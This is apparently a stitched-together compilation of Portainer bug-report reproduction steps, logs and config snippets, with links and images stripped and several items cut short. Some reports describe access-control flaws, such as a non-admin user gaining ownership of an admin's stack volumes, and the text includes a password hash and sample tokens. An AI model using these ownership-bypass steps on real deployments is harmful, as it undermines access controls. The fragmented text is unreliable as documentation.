configure the container and click on the `deploy the container` button
see failure access denied to resource error
![image](
see that the container is stuck in a `created` state
on an old ipad go to the portainer url
see no login fields
add a user to dev team (assigned as endpoint administrator on endpoint1)
add same user to prod team (assigned as read-only on endpoint1)
delete prod team
login as user and see user is still being restricted to read-only
be behind an omnipresent corporate firewall that will - by default - block server access to github.com
launch portainer on docker hosted on such a blocked server, using either ~/.docker/config.json, --env passed to docker-compose, or an `environment` section in docker compose to set `https_proxy` to the correct environment variable.
with portainer pointing at some docker swarm or instance, attempt to install iron functions or some other built in app template that is hosted in the portainer/templates repository
deploy a stack as an admin named `test`
![image]( 2
log in as a non-admin and create a volume named `test`
see that non-admin user now has ownership of the stack
![image](
go to volumes view as non-admin user
try to create a volume with the same name as a stack created volume e.g
`test_test` which already exists
see that the creation succeeds and you now have ownership of the `test_test` volume note: if the admin owned volume already exists but is not in use, then the creation succeeds without error, but the non-admin user does not get ownership.
go to stacks, new stack
click on web editor
copy above configuration
create multi node windows 2019 docker swarm, 3 managers, 2 work nodes 2
try to connect using ip address:9000
connect fails from browser/curl etc.
go to local, then containers, and click on the container name (pihole in this case).
click on "duplicate/edit"
scroll down to the bottom
click on network
click "add additional entry" and add host:ip 6
click "deploy the container"
accept prompt "are you sure? a container with the same name...."
trigger the issue: - **on develop branch:** add azure registry, confirm you can browse it, click on the registry in portainer & click `update registry` button (without re-entering password) - **on all images:** add the registry in portainer with an incorrect password then update the registry with the correct password
click on browse & see the ` registry management configuration required` message
![screenshot from 2019-10-01 14-31-23](
click `configure this registry message` and then click `test configuration` `failure invalid certificate file
ensure that the file is uploaded correctly`
![screenshot from 2019-10-01 14-31-57](
and see this error in the portainer logs: `http error: invalid request payload (err=invalid certificate file
ensure that the file is uploaded correctly) (code=400)`
enter correct password, click `test configuration` again and still get above error
go back to registry and add the correct password and save
still receive the invalid configuration error
assign ldap user to endpoint and attempt to login.
add my github package registry with credentials in registry view
deploy and service using an image from this registry
see the tasks are rejected with `no such image`
pull image via portainer and see that the tasks now succeed.
start a new portainer instance
activate oauth extension
configure oauth
logout and try to connect with the login form and invalid credentials
`docker logs portainer`
run a container with a health check (like mysql/mysql-server:latest)
on the containers overview page it is not there.
stop the container from the command line
on the containers overview page it is now there in a stopped state.
start it, and it will disappear **you can also recreate this by pausing a container:**
on the containers overview page select a container and click the pause button to pause it
refresh the page and see that it is no longer present in the constainers overview page **known workarounds:**
- use the command line to see and manage the container
- if the container is part of a stack, view it from the stack, the container display inside stack allows you to see them
- open a new incognito window in chrome (not incognito tab) and the containers should display
- delete the portainer cookies
follow instructions in the edge agent setup guide (
create edge agent on synology host using command: `sudo docker run -d -v /var/run/docker.sock:/var/run/docker.sock -v /volume1/@docker/volumes:/var/lib/docker/volumes -v /:/host --restart always -e edge=1 -e edge_id=<edge_id> -e cap_host_management=1 -p 8000:80 -v portainer_agent_data:/data --name portainer_edge_agent portainer/agent`
associate edge agent with portainer through web ui (portainer ui states that the agent is associated)
attempt to connect to edge agent, which fails
logs for edge agent container state that connection was successful (and states fingerprint).
go to any registered edge endpoint
click on `app templates`
select a container hosted locally
enter a name: `nginx test`
click `deploy the the container`
see the error popup:
no such image: myregistry:5000/nginx:latest
go to `stacks` and click `add stack`
click on `repository`
set the following and click create:
repository url: ` `
compose path: docker-stack.yaml
browse a registry
select a tag on page 1 and another tag on page 2
go back to page one and see the first tag no longer selected, go back to page 2 and see the tag is still selected
(on windows)
go to images view
try to pull the mssql/server image from mcr.microsoft.com
get `image successfully pulled` toast notification
see that the image hasn't actually pulled
go to homeview
click on down endpoint to trigger the ping
ping fails as backend responds
endpoint does not show as up
see below errors: - error displayed in ui `failure: endpoint is unreachable
connect to another swarm manager`
![no_update]( - error thrown in portianer logs: `http error: unable to query endpoint (err=endpoint is down) (code=503)` **note:** clicking the refresh button will then show the endpoint as up.
create an oauth user
add user to a team
assign the team "endpoint administrator" management access to at least one endpoint
deploy portainer instance on localhost:9000
deploy agent in cluster 3
create agent endpoint on localhost:9000 and manage it
![portainer(1)]( 4
deploy portainer instance on localhost:9002
create agent endpoint on localhost:9002 (at this time, endpoint is shown as down)
![portainer(2)]( 6
docker service update agent with `--force` flag
refresh snapshots on localhost:9002 (now agent endpoint is up)
![portainer(3)]( 8
in the home view of localhost:9000, click on `up` agent endpoint and get error message ![portainer(4)](
refresh view on localhost:9000, endpoint is `down`
![portainer(5)](
go to services
click on some of services to expand them
turn on auto-refresh
see the page refresh and the services will be collapsed
go to a place where there is a number input e.g create service
click the down arrow on the `replicas` input a few times
see it go into negative numbers
**note: this is just an example and is repeatable on other inputs also.**
![negative](
go to services view and click the checkbox of a service
see the task status table show
![services bug](
create 2 persistent volumes, name one and let docker name the other
add a service, mount these persistent volumes to it, then deploy
edit the service 2
see below problem where the persistent volumes are not saved, instead we have the `select a volume` dropdown _v1.19.0 & v1.20.0_
![1 19 1 20]( _v1.21.0 & v1.22.0_
![1 21 1 22](
go to containers
the containers are sorted by state
click on any other column header than state
click refresh
the containers are sorted by state again
go to `/#/registries`
add a custom registry that requires credentials
this registry doesn't have to exist to reproduce these steps, so pick whatever you want.
enable authentication and enter anything you want for a username and password
click add registry.
now go back to `/#/registries` and click manage access for the newly created entry.
choose a user or team under create access, then click the create access button.
see error: "invalid credentials
username and password must be specified when authentication is enabled"
![image](
go to stacks
click on add stack
add environment variables
deploy the stack
_with rm extension activated_
create a registry with valid url
browse (should be able to list repositories & co)
edit url to invalid one (`/#/registries/:id`)
try to browse : still able to do it
backend still using the previous valid url same steps can be done inverting valid and invalid urls:
create a registry with invalid url
browse (should not be able to list repositories & co)
edit url to valid one (`/#/registries/:id`)
try to browse : still not able to do it
backend still using the previous invalid url only way to force the new url to be used is to go to `/#/registries/:id/configure` and test the configuration
the `test configration` will force the backend to use the new url for this registry (not even needed to apply changes there, clicking the "test" button is enough to trigger the url update on backend.
build image from latest commit of develop branch
click on a view in portainer with a table, e.g volumes
see there is no default sort selected **no default sort bug:**
![screenshot from 2019-07-12 10-27-39](
deploy a service
click on your service to view its service details view
see the box next to the service webhook toggle
![image](
steps to reproduce the behavior:
click on 'primary' endpoint
see error :
unable to connect to the docker environment
try to configure oauth with okta and it fails
* portainer version: 1.21.0
steps to reproduce the behavior:
go to 'images' -> 'build a new image'
name it `test_postgres:latest`
enter the following as dockerfile
```dockerfile
from postgres
env postgres_user kyle
create a container from `test_postgres:latest` with name `testpostgres`
go to 'images' -> 'build a new image'
name is still `test_postgres:latest`
enter the following as dockerfile
```dockerfile
from postgres
env postgres_user cartman
go to 'containers' -> 'testpostgres' 11
hit `recreate` and choose to pull the image
go to `testpostgres` container and look at the `env` variables -> i would expect `postgres_user cartman`, but it is still `postgres_user kyle`
go to 'containers' -> 'testpostgres' 14
hit `duplicate/edit`
in 'advanced container settings' go to 'env' tab -> i would not expect anything to be set here, as i never set a variable from neither portainer's ui, nor `docker` cli in the context of `postgresql` this is even more tricky, as it sets a variable called `gosu_version` (not sure what for)
if this ever changes it is very hard to determine when using portainer
this means, that on every `duplicate/edit` with a new image version i need to check all `env` variables and manually remove those, which i didn't set myself
also, this makes `recreate` quite useless for this scenario.
create 30000 empty docker volumes (so the docker volume ls command takes longer than ten seconds)
navigate to volumes view and receive unable to retrieve volumes error
![image]( 3
navigate to home view
click on agent enabled endpoint (which is shown as up in portainer)
error occurs saying endpoint is down
![image]( **additional notes:**
- after a browser refresh the endpoint shows as down and you cannot browse
![image]( - sometimes you can click browse but then receive a lot of errors
![image]( - after a while the endpoint will show as up again and be browse-able - snapshot errors in browser
![image](
create your nfs volume:
docker volume create --driver local \\ --opt type=nfs \\ --opt o=addr=mynfsshare,nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport \\ --opt device=:/portainer \\ portainer_data
``` * validate it's working: `docker run --rm -it -v portainer_data:/data busybox ls -al /data`
start portainer with that volume mapped onto the data dir:
docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
try to curl the port, or do anything with the volume, and it hangs..
you can't kill portainer's pid, or remove the container without rebooting the host
after a two minutes, you'll start to see these messages in dmesg:
info: task portainer:4254 blocked for more than 120 seconds.
deploy an agent + portainer setup
manage the agent endpoint
drain a node inside the cluster through the ui
directly try to manage the endpoint (access containers, volumes, etc...) and see that one request will fail **additional info:** as stated in portainer/agent#56, the time it takes for an agent to acknowledge another agent as unavailable is actually quite fast (5-10 seconds)
i think that the issue is related to the portainer api and how it handles connection to the agent through swarm (either dns via tasks.agent or through routing mesh / direct host port) and not the agent itself.
steps to reproduce the behavior:
login to portainer
go to "containers" page
set "items per page" to "100"
hide one columns
logout to portainer
login back to portainer
go to "containers" page
the previous sets got reverted to default (10 items per page and all column visible)
steps to reproduce the behavior:
create new private registry
create new app template
write some parameters in template
deploy container
see error:"failure:invalid reference format"
steps to reproduce the behavior:
go to 'stacks'
click on 'add stack'
add stack name 'func'
select 'use a git repository'
add repository url '
click 'deploy the stack'
steps to reproduce the behavior:
select local-persist driver
add mount option
enter name 4
enter value (a valid path) using: `mountpoint=/data/images` (same without `mountpoint=`)
press `create the volume` button
steps to reproduce the behavior:
run the local registry by running:
docker run -p 5000:5000 --name registry -e registry_storage_delete_enabled=true -v <directory_of_the_local_registry>:/var/lib/registry registry:2
assuming the registry manager extension is enabled, use "custom registry" to setup the registry
enter a registry name and enter the url which is the url of the local registry: <ip_address>:5000
click on "add registry"
push an image with different tag names, for example, i pushed the hello-world image to the local registry with different tags:
docker tag hello-world localhost:5000/hello-world:latest
docker tag hello-world localhost:5000/hello-world:lts
docker tag hello-world localhost:5000/hello-world:1.0.0
docker push localhost:5000/hello-world:latest
docker push localhost:5000/hello-world:lts
docker push localhost:5000/hello-world:1.0.0
go back to portainer, click on "registry" then "browse", then "hello-world"
you should be ble to see all the images, but refresh the page.
you should see that all the images disappeared and the error "failure: unable to retrieve tag latest", "failure: unable to retrieve tag lts", "failure: unable to retrieve tag 1.0.0"
steps to reproduce the behavior:
create a new stack in portainer
create docker-compose in portainer editor, with:
version: "3.7" services: powerdns-admin: build: context: /users/maria/desktop/dockertest
``` also tried github link as context.
tried with quotes
press update the stack
goto volumes
- add name > db
- use nfs volume
- address > 192.168.1.48
- nfs version > nfs
- mount point > /path/to/folder 1
goto containers
add container
- name > mysql
- image > percona:ps-8
- port mapping > 3306 to 3306
- click volumes
- map additional volume
-- container > /etc/mysql/conf.d, volume > db
-- contaner > /var/lib/mysql, volume > db - click env
- add environment variable
-- name > mysql_root_password, value > root deploy the container then up comes the red notification (failed to chmod )
go to the portainer gui and enter the containers section
click on console button
throws an popup error message: unable to retrieve images details
steps to reproduce the behavior:
enter to the container's terminal;
type somithing in english for example;
switch language;
type any text(you will not see symbols);
switch back to english;
type any text;
text doesn't showing.
steps to reproduce the behavior:
setup a docker multi-node swarm (windows only)
install portainer through a single-replicated global service (manager only)
expose a tcp endpoint on the same manager portainer is running by changing the docker daemon.json file in programdata/docker
attempt to connect to local daemon
steps to reproduce the behavior:
launch new portainer stack
wait for snapshot to occur
watch for error in logs about endpoint not being available
go to 'create service' view
click on 'secrets tab' at bottom of screen
click 'add a secret' and select your secret
repeat step 3 with the same secret
click 'create the service' **see below error**
![selection_003](
steps to reproduce the behavior:
go to 'users' view
within add a new user widget fill in details for a new user (making sure there are spaces in the name)
click 'create user'
see incorrect error
![selection_002](
steps to reproduce the behavior:
**assuming there is an endpoint with an assigned tag**
go to 'home' view
enter all or part of the tag name in the search box
matching endpoint is not shown, in fact no endpoints are shown
steps to reproduce the behavior:
define a `docker-compose.yaml` file similar to the one given above.
`docker-compose up -d portainer`
in a web-browser, navigate to portainer on port 9000.
attempt to login with username `admin` and password matching the contents of the portainer_admin_password file.
steps to reproduce the behavior: assuming there are multiple users and or teams:
go to 'endpoint access or group access view on a group or endpoint'
click on 'authorize all' or 'deny all' buttons
not all users and or teams will be moved
steps to reproduce the behavior:
go to 'team details view for a team and make sure there is a team leader present in the team
click on 'remove all users' or the 'remove' button next to the team leader name
see error i.e the team leader count is not updated to show that the team leader has been removed.
for example i have 3 host machines, on each machine i have installed portainer agent on same overlay network
added 1 among this 3 node machine as end point to portainer instance
after stack deployment of my app image.
steps to reproduce the behavior:
go to 'services'
click on 'stats icon'
on the top right corner, i\'m seeing the error "unable to retrieve container information"
install portainer container (docker)
using following flags - `--external-endpoints /data/endpoints.json` - `--no-auth`
open portainer in firefox or other browser
(note: i used reverse proxy in front of portainer container)
` `
try to complete setup process it's should stop when you try to select local and then continue
(there is no option to ignore selecting of endpoint) any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i did expect automatically going to endpoint list after starting portainer
i could avoid --no-auth if it's possible to set admin username at start example:
`--admin-user example --admin-password $2y$05$qfhalnah0a.6ocde1/4w.uecwc/itfbmxihbi97qyfmwlmcj7n.a6` or `--auth example:$2y$05$qfhalnah0a.6ocde1/4w.uecwc/itfbmxihbi97qyfmwlmcj7n.a6
steps to reproduce the behavior (named pipe):
install portainer on windows server 2019 through the official [installation steps](
start
select the left most option, "local, manage the local docker environment"
no endpoints are listed steps to reproduce the behavior (tcp):
add a new endpoint in the endpoint tab
select the left most option, "docker, docker environment"
fill in the blanks; name="local", endpoint url=" " (this ip address is the docker host\'s ip address)
click the "add endpoint" button
on the top right displays a green block with a check and text "endpoint created"
the endpoint somehow never shows up
steps to reproduce the behavior:
go to portainer stack menu
click on 'add stack'
fill in required detail
click 'deploy the stack'
<img width="317" alt="screen shot 2019-03-13 at 1 37 27 pm" src=" ">
steps to reproduce the behavior:
go to services inside a swarm environment that is not running the portainer agent
click on a service
click on the stats or console icons under the actions column
s below <img width="310" alt="screen shot 2019-03-08 at 3 24 16 pm" src=" "> <img width="1005" alt="screen shot 2019-03-08 at 3 25 25 pm" src=" ">
steps to reproduce the behavior:
go to 'stacks'
click on '+ add stack'
add name and define stack and click on 'deploy the stack'
error during connect: get dial tcp: lookup /var/run/docker.sock: no such host
docker pull portainer/portainer
docker run -d --restart always --name portainer --isolation process -h portainer -p 9000:9000 -v c:\\programdata\\portainer:c:\\data -v //./pipe/docker_engine://./pipe/docker_engine portainer/portainer ```
steps to reproduce the behavior:
run portainer with the no-auth flag
go to portainer in a browser
notice missing registries in side-bar
- server and client certificates/keys signed by ca
- server certs used by docker engine - client certs used by portainer - ca used by both 2
start remote docker engine: `dockerd --tlsverify --tlscacert=/root/ca.pem --tlscert=/root/server-cert.pem --tlskey=/root/server-key.pem -h tcp://192.168.100.2:2376` 3
start portainer container `docker run -d -p 9000:9000 --name portainer -v /home/ash/certs:/certs -v portainer_data:/data portainer/portainer` 4
choose to add remote endpoint 5
upload tls certs from bind-mount location of /home/ash/certs 6
click connect
create an app template using a remote compose file, with variablized version variables.
create several variables for the template using the select list (see screenshot)
![image]( note: sensitive information redacted 3
add some presets, but select the select list button
![image]( 4
save the template and create a stack.
![image]( 5
the stack immediately reverts to the presets, even though we want to select from a list.
![image](
block access to the registry and try to download the image.
login --> select swarm --> select stacks
steps to reproduce the behavior:
logout portainer
login portainer
`portainer.home` shows, do not click any endpoints
visit #/templates
page is blank
$ curl -v -h 'authorization: bearer $token'
< http/2 502 [...]
< content-length: 0
steps to reproduce the behavior:
session timeout
click any page
redirect to `/auth`
enter user and password, click on 'login'
login seems no response
press f5, it redirect to `/home`, login actually is successful
steps to reproduce the behavior:
go to 'dashboard' / 'containers create' / other pages
steps to reproduce the behavior:
go to 'containers'
click on 'add container'
steps to reproduce the behavior:
stop container
click on duplicate/edit
scroll down to runtime and resources
drag slider to unlimited, and click deploy
slider resets to previous value
note selecting a non-unlimited value works as expected
steps to reproduce the behavior:
create a local registry with a port like 5000 (in my case it's `localhost:5000`)
push any image to that regitry
deploy an container using the pushed image
update the image and push the new image
goto
select your image
open network monitor
click pull from registry
notice the image name is wrongly splitted and the `invalid tag format` error
steps to reproduce the behavior: 1
run a container that serves git repos on the same network as portainer, i used this one: 2
put a repo with a submodule inside of the container that serve git repos
try to clone in a app template the submodule itself
path i've used: ` `
steps to reproduce the behavior:
1) create volume and abc.tar.gz file in it:
[vweng@bugatti ~]$ docker volume create test
[vweng@bugatti ~]$ docker run -d -it -v test:/test busybox
1dac573e7ef25406b26429c2d8c24b073709f08e8ac0204502ec0c195e5625e7
[vweng@bugatti ~]$ docker exec -it 1dac573e7ef2 sh
/ # cd test
/test # touch abc
/test # tar zcf abc.tar.gz abc
/test # ls -l
-rw-r--r-- 1 root root 0 jan 28 16:46 abc
-rw-r--r-- 1 root root 86 jan 28 16:47 abc.tar.gz 2) now go to portainer ui and find the volume "test" and download the abc.tar.gz from browser 3) try open the abc.tar.gz file:
$ tar zxf abc.tar.gz tar: unrecognized archive format
tar: error exit delayed from previous errors.
here is a simple python3 script to demonstrate this issue (require [requests]( ```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from threading import thread
from uuid import uuid4 import requests # adjust the following according your needs
url = " "
user = "admin"
password = "secret"
swarm_id = "m58zcbi6gz2h27inqqwldwbod" # this is a very simple test stack definition
spec = """version: \'3.3\'
services: test: image: containous/whoami deploy: mode: replicated replicas: 1
""" def create(user, password): # login r = requests.post( url=f"{url}/auth", json={"username": user, "password": password} ) print(f"login response: {r.json()}") token = r.json().get("jwt") headers = {"authorization": f"bearer {token}"} # create stack params = {"method": "string", "type": "1", "endpointid": "1"} json = { "name": f"test-concurrent-{str(uuid4())}", "stackfilecontent": spec, "swarmid": swarm_id, "env": [], } r = requests.post( url=f"{url}/stacks", json=json, params=params, headers=headers ) print(f"create stack response: {r.json()}") def main(): # create 2 stacks concurrently in 2 separate threads threads = [thread(target=create, args=(user, password)) for _ in range(2)] for t in threads: t.start() for t in threads: t.join() if __name__ == "__main__": main()
``` this script create only 2 stacks concurrently but you can easily increase this number by increasing the number of created threads
example output: ```js
login response: {'jwt': 'eyjhbgcioijiuzi1niisinr5cci6ikpxv.eyjpzci6mswidxnlcm5hbwuioijhzg1pbiisinjvbguiojesimv4cci6mtu0nzg0odgx.vsnnsozej2juvcnuie8hkmemrd2vsjdy_0s4zusu'}
login response: {'jwt': 'eyjhbgcioijiuzi1niisinr5cci6ikpxv.eyjpzci6mswidxnlcm5hbwuioijhzg1pbiisinjvbguiojesimv4cci6mtu0nzg0odgx.vsnnsozej2juvcnuie8hkmemrd2vsjdy_0s4zusu'}
create stack response: {'id': 301, 'name': 'test-concurrent-a58071af-2037-44cd-ba06-1270844b4390', 'type': 1, 'endpointid': 1, 'swarmid': 'm58zcbi6gz2h27inqqwldwbod', 'entrypoint': 'docker-compose.yml', 'env': [], 'projectpath': '/data/compose/301'}
create stack response: {'id': 301, 'name': 'test-concurrent-768aef48-a2dd-49b0-8d3e-550784d592fb', 'type': 1, 'endpointid': 1, 'swarmid': 'm58zcbi6gz2h27inqqwldwbod', 'entrypoint': 'docker-compose.yml', 'env': [], 'projectpath': '/data/compose/301'}
connect to any container console on any docker host configured with the portainer agent
return to home page
do not refresh the browser
click any endpoint that is configured with the portainer agent and isn't the one you just used.
`failure: unable to query endpoint` error shows endpoints configured over tcp still work fine.
steps to reproduce the behavior:
create a network
connect a container to the network
click the network name
steps to reproduce the behavior:
under 'settings' in the left menu
click on 'users' and pick 'teams'
in the input field 'name' type 'a & b' and press enter
scroll down to the 'teams' list and see error (shown as `a &amp; b`)
steps to reproduce the behavior:
create a stack as non adminstrator with the following config (just relevant parts): ```
version: '2' services: whoami: image: emilevauge/whoami volumes: - whoami:/tmp/ volumes: whoami: driver: local
enable access control (is default)
click 'deploy the stack'
click on 'volumes' on the left and see no volume:
![volumes_waja](
navigate to 'container details' of the created container and see the attached volume there.
![container](
clicking on the volume brings you back to the volume view with the following error:
![error](
logged in a administrator reveals that the volume ownership was given to the object 'administrator':
![volumes_admin](
steps to reproduce the behavior:
add registry with authentication and images in it in portainer dashboard
deploy new stack from dashboard with some images in global mode
join new node to cluster
attempt to deploy the above stack.
see my bug description
current deployment:
server: gce
registry: gitlab.com private registry (i am very very sure the credentials set in portainer's gui is correct
however, i am curious how to validate it.) steps to reproduce the behavior:
go to the a service page
click on`update the service`
check the `pull latest image version` option
app's container recreated but image version is not updated.
steps to reproduce the behavior:
install firefox for ios
go to portainer login address
attempt to login with credentials
login attempt invalid
create new stack from web ui
enter docker-compose file in web editor ```
version: '2'
services: hello_world: image: ubuntu command: [/bin/echo, 'hello world'] ``` 2
click "deploy the stack"
error shown in console and also in browser.
console message is > ash-4.3# docker-compose up
> starting portainer ...
> starting portainer ..
> attaching to portainer
> portainer | 2018/12/26 08:53:50 templates already registered inside the database
skipping template import.
> portainer | 2018/12/26 08:53:50 instance already has defined endpoints
skipping the endpoint defined via cli.
> portainer | 2018/12/26 08:53:50 starting portainer 1.20.0 on :9000
> portainer | 2018/12/26 08:54:04 http error: invalid jwt token (err=invalid jwt token) (code=401)
> portainer | time="2018-12-26t09:00:46z" level=info msg="[0/1] [hello_world]: starting "
> portainer | time="2018-12-26t09:00:48z" level=error msg="failed starting hello_world : error response from daemon: oci runtime error: container_linux.go:247: starting container process caused \\"process_linux.go:291: setting cgroup config for ready process caused \\\\\\"failed to write 0 to memory.swappiness: write /sys/fs/cgroup/memory/docker/68868f3208ec7b0257a13718a0ed454b1d008d9ccf503e31b1dff413b1d63b46/memory.swappiness: invalid argument\\\\\\"\\""
> portainer | time="2018-12-26t09:00:48z" level=error msg="failed to start: hello_world : error response from daemon: oci runtime error: container_linux.go:247: starting container process caused \\"process_linux.go:291: setting cgroup config for ready process caused \\\\\\"failed to write 0 to memory.swappiness: write /sys/fs/cgroup/memory/docker/68868f3208ec7b0257a13718a0ed454b1d008d9ccf503e31b1dff413b1d63b46/memory.swappiness: invalid argument\\\\\\"\\""
> portainer | 2018/12/26 09:00:48 http error: error response from daemon: oci runtime error: container_linux.go:247: starting container process caused "process_linux.go:291: setting cgroup config for ready process caused \\"failed to write 0 to memory.swappiness: write /sys/fs/cgroup/memory/docker/68868f3208ec7b0257a13718a0ed454b1d008d9ccf503e31b1dff413b1d63b46/memory.swappiness: invalid argument\\"" (err=error response from daemon: oci runtime error: container_linux.go:247: starting container process caused "process_linux.go:291: setting cgroup config for ready process caused \\"failed to write 0 to memory.swappiness: write /sys/fs/cgroup/memory/docker/68868f3208ec7b0257a13718a0ed454b1d008d9ccf503e31b1dff413b1d63b46/memory.swappiness: invalid argument\\"") (code=500)
steps to reproduce the behavior:
create container with published ports (in my case 8080 -> 80, 4433 -> 443)
stop container
edit env variables
deploy with new settings
steps to reproduce the behavior:
refresh **container stats** page many times (press f5 every second) , it shows **endpoint is down**, **unable to query endpoint**
then go to container list, it shows **offline mode**: **this endpoint is currently offline (read-only)**
edit, duplicate and recreate running container
no ideas at all.
this seems to be related to host job schedule, which looks new in 1.20.0.
steps to reproduce the behavior:
go to shell, and deploy a stack similar to this (stack core) ``` version: '3.3' services: csi-portainer-agent: image: portainer/agent environment: agent_cluster_addr: tasks.core_csi-portainer-agent agent_port: 9001 (i also tried with no agent_port set, with no success) # log_level: debug volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes
# ports: (after read other github issue thread i tried set the port, with no luck)
# - target: 9001
# published: 9001
# protocol: tcp
# mode: host networks: redebackbone: deploy: mode: global placement: constraints: [node.platform.os == linux]
login in portainer and try to add a new endpoint **name:** docker-agent
**endpoint url:** tasks.core_csi-portainer-agent:9001 (the dns resolution is ok, giving one entry for each agent)(i also tried put the ipvs address core_csi-portainer-agent:9001, it appear to be more resilient, and works better than the official way, but very unstable showing pages
**public ip:** core_csi-portainer-agent (the dns resolution is ok, giving the ipvs address) 3
go to the main page ![screenshot_2018-11-29 portainer]( the endpoint appears to be running and ready, click on it, then the dashboard page appears empty with no data, but the endpoint is selected
so try to browse between containers, services, images, volumes .., sometimes it works, but after a few commands the agents stop working and the agent logs start with entries like this: ([err] memberlist: push/pull with 8db633a4b3a6 failed: dial tcp 172.20.1.6:7946: i/o timeout) or this ([info] memberlist: suspect 8db633a4b3a6 has failed, no acks received) or this (http error: unable to execute cluster operation (err=get net/http: request canceled while waiting for connection (client.timeout exceeded while awaiting headers)) (code=500))
![screenshot_2018-11-29 portainer2](
![screenshot_2018-11-29 portainer3](
![screenshot_2018-11-29 portainer8]( if i update the service, it will be running for some time and after that it stops working once more
if i left it intact and after some time i retry to browse the agent endpoint, it works for some time before die
![screenshot_2018-11-29 portainer4](
$ docker --version
docker version 18.09.0, build 4d60db4
$ docker volume create portainer_data
portainer_data
$ docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
ce7e27ba2c0ffe824d5f5f77c31528392389d0d185c97db14674d1a7caedd601
``` ![image]( ![image]( but, when i hit "back" in the browser: ![image]( when i install the current `develop` tag from docker hub, it works.
steps to reproduce the behavior:
starting portainer with the provided `docker-compose.yml` see ![command]( 2
starting another container with the label `portainer.hidden=true` (in our case traefik) see ![label]( 3
navigate to `/#/containers`
no containers are filtered and even not custom logo, see ![containers](
steps to reproduce the behavior:
create a new instance of portainer (clear db)
create the default docker endpoint
change url to `/dashboard`
see console
go to images tab
specify any image in the image input box
pull the image.
steps to reproduce the behavior:
install the cloudstor:azure plugin on a manager node.
deploy the above example portainer stack.
verify everything works as intended.
wait several hours.
swarm operations will return persistence errors
<details><summary>example cloudstor:azure install command</summary> ```
docker plugin install --alias cloudstor:azure --grant-all-permissions \\ docker4x/cloudstor:18.03.1-ce-azure1 cloud_platform=azure debug=1 \\ azure_storage_account="your-account-name" \\ azure_storage_account_key="your-account-key"
``` </details><br />
steps to reproduce the behavior:
select a stopped container
go to 'containers'
click on 'container stat' icon red prompt showing some javascript error
create a container with logging drivers and opts like
``` "logconfig": { "config": { "mode": "non-blocking", "syslog-address": "tcp://nj-dacontainer-1:5140", "tag": "{{.imagename}}/{{.name}}/{{.id}}" }, "type": "syslog" }
deploy container
open container and hit `duplicate/edit`
logging option shows `default log drive` instead of `syslog`, and all log-opts are lost as well
as screenshot below:
![screen shot 2018-10-31 at 3 32 27 pm]( * portainer version: `portainer/portainer:pr2384`
* docker version (managed by portainer): not related to this issue
* platform (windows/linux): not related to this issue
steps to reproduce the behavior:
go to 'containers'.
click on a container and duplicate/edit.
modify or create a variable in the env tab.
deploy the container.
steps to reproduce the behavior:
automatically restart the server
login into portainer
observe that the swarm is down
steps to reproduce the behavior:
make two simultaneous call on post /api/stacks?endpointid=1&method=string&type=1 with different payload
go to stack page
click add stack button
specify name for the new stack
click the repository button
enter repository url
leave repository reference empty for master
enter stack file name
click radio button to enable auth
add user name and password
click "deploy the stack" button got error message unable to deploy the stack.
using the following docker-compose.yml file:
version: '2' services: app: image: php:fpm networks: default: ipam: config: - subnet: 172.172.0.0/24
``` `docker-compose up` sets the network fine; using portainer's stack deployment does not.
steps to reproduce the behavior:
go to an existing container.
click on "duplicate / edit"
make a change (i usually change a label or env var)
click "deploy the container"
click "replace" on the dialog
1) docker run -d -p 9000:9000 --name portainer --restart always -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine -v e:\\programdata\\portainer:c:\\data portainer/portainer where e: is my smbglobalmapping in sofs refs.
steps to reproduce the behavior:
create a stack with a relative mount in a git repo
version: "2"
services: home-assistant: image: homeassistant/home-assistant volumes: - ./config/homeassistant:/config
start the stack trough portainer
see a new folder on the host ```/data```..
and see that folder mounted instead of the correct folder
steps to reproduce the behavior:
create a dockerfile for printing an environmental variable
create a new stack from api using the env parameter
look at the logs
steps to reproduce the behavior:
push the same stack twice using different names
try to remove both
steps to reproduce the behavior:
open portainer normally
leave the swarm from docker console (docker swarm leave --force)
create a new swarm (docker swarm init)
restart the machine (i'd changed the ip and some rules that broke the docker table) 5
docker portainer print logs that service is listening on port 9000 and is started, but docker ps show no port mappings for the container, telnet to port 9000 on container ip doesn't work and docker restart containername also doesn't work
2018/10/09 22:47:02 templates already registered inside the database
skipping template import.
2018/10/09 22:47:02 instance already has defined endpoints
skipping the endpoint defined via cli.
2018/10/09 22:47:02 starting portainer 1.19.1 on :9000 6
if i remove the current portainer container with docker rm containername and recreate another one with the previous volumes, the portainer will login and operate normally.
steps to reproduce the behavior: post on /api/stacks?type=2&method=string&endpointid=3 with this body:
{"stackfilecontent": "# docker-compose build && docker-compose up -d\\\\# if \\"docker-compose logs ckan\\" shows db not ready, run \\"docker-compose restart ckan\\" a few times.\\\\##################################################################\\\\# matteo de stefano, francesco frassinelli - derived from:\\\\# \\"3\\"\\\\\\\\volumes:\\\\# ckan_config:\\\\# ckan_home:\\\\ ckan_storage:\\\\ pg_data:\\\\\\\\services:\\\\ ckan:\\\\ container_name: ckan\\\\ image: registry.gitlab.com/nina-data/nina-ckan-coat:latest\\\\ links:\\\\ - db\\\\ - solr\\\\ - redis\\\\ ports:\\\\ - \\"${ckan_port}:5000\\"\\\\ environment:\\\\ # defaults work with linked containers, change to use own postgres, solr, redis or datapusher\\\\ - ckan_sqlalchemy_url=postgresql://ckan:${postgres_password}@db/ckan\\\\ - ckan_datastore_write_url=postgresql://ckan:${postgres_password}@db/datastore\\\\ - ckan_datastore_read_url=postgresql://datastore_ro:${datastore_readonly_password}@db/datastore\\\\ - ckan_solr_url= - ckan_redis_url=redis://redis:6379/1\\\\ - ckan_datapusher_url= - ckan_site_url=${ckan_site_url}\\\\ - ckan_max_upload_size_mb=${ckan_max_upload_size_mb}\\\\ - postgres_password=${postgres_password}\\\\ - ds_ro_pass=${datastore_readonly_password}\\\\ volumes:\\\\# - ckan_config:/etc/ckan\\\\# - ckan_home:/usr/lib/ckan\\\\ - ckan_storage:/var/lib/ckan\\\\\\\\ datapusher:\\\\ container_name: datapusher\\\\ image: clementmouchet/datapusher\\\\ 